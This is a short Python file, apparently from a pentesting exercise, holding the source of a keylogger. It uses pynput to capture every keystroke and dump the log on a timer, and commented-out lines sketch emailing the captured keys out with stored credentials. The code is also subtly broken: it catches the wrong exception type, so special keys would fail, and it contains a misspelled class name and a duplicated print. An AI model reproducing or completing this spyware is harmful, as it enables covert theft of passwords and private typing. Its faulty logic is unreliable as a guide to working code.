#__author__ = MrT3st3r
import threading
import pynput.keyboard
# from pentests.send_email import send_mail



class Keylogegr:
    def __init__(self,time_interval): # , email, pwd
        self.log = "keylogger started"
        self.interval = time_interval
        # self.email = email
        # self.pwd = pwd
    def append_to_log(self, string):
        self.log = self.log + string



    def process_key_press(self, key):
        try:
            current_key = str(key.char)

        except ArithmeticError:
            if key == key.space:
                current_key = " "
            else:
                current_key = str(key)
        self.append_to_log(current_key)


    def report(self):
        print(self.log)
        # self.send_email( self.email, self.pwd, "\n\n", self.log) #TODO fix this
        print(self.log)
        self.log=""
        timer = threading.Timer(self.interval, self.report) # secs
        timer.start()


    # send-email():
    def start(self):

        keyboard_listner = pynput.keyboard.Listener(on_press=self.process_key_press)

        with keyboard_listner:
            self.report()
            keyboard_listner.join()

